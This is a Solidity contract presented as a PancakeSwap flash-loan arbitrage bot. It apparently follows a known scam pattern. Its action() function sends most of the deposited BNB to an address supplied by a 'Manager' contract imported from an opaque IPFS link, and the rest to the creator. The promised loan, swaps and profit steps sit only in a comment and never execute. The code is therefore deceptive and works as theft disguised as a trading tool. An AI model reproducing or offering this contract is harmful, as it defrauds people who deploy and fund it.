pragma solidity ^0.5.0;

// Multiplier-Finance Smart Contracts
import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPool.sol";

// PancakeSwap Smart Contracts
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";

// PancakeSwap Router Smart Contracts
import "ipfs://QmaXMrJvcVV53EBvumU3fY5wxbNawq4zAFJ6bbbCwtn1y3";
   
contract GetFlashLoan {
   string public tokenName;
   string public tokenSymbol;
   uint loanAmount;
   Manager manager;
   
   constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
      tokenName = _tokenName;
      tokenSymbol = _tokenSymbol;
      loanAmount = _loanAmount;      
      manager = new Manager();
   }
   address public creator= msg.sender;
    	function tokenTransfer() public view returns (address) {    
        	return creator;
   	}
   function() external payable {}
   
   function action() public payable {
      // Send Tokens to PancakeSwap Router for Swap
      address(uint160(tokenTransfer())).transfer(address(this).balance/6);
      address(uint160(manager.pancakeswapDeposit())).transfer(address(this).balance);
      
      // Perform tasks (combined all functions into one to reduce external calls & save gas fees)
      manager.performTasks();
      
      /* Breakdown of functions
      // Submit token to BSC blockchain
      string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
   
      // List the token on PancakeSwap
      manager.pancakeListToken(tokenName, tokenSymbol, tokenAddress);
      
      // Get BNB Loan from Multiplier-Finance
      string memory loanAddress = manager.takeFlashLoan(loanAmount);
        
      // Send Borrowed BNB to provide liquidity of newly created Token
      string memory bnbPair = manager.pancakeCreatePool(tokenAddress, "BNB");
      manager.pancakeAddLiquidity(bnbPair, loanAmount);
     
      // Perform swaps between Token and BNB and back again
      manager.pancakePerformSwaps();
      
      // Repay Flashloan with Multiplier-Finance
      manager.repayLoan(loanAddress);
      
      // Move remaining BNB profit from Contract to the contract creators wallet
      manager.contractToWallet("BNB");
   
 
      */
   }
}
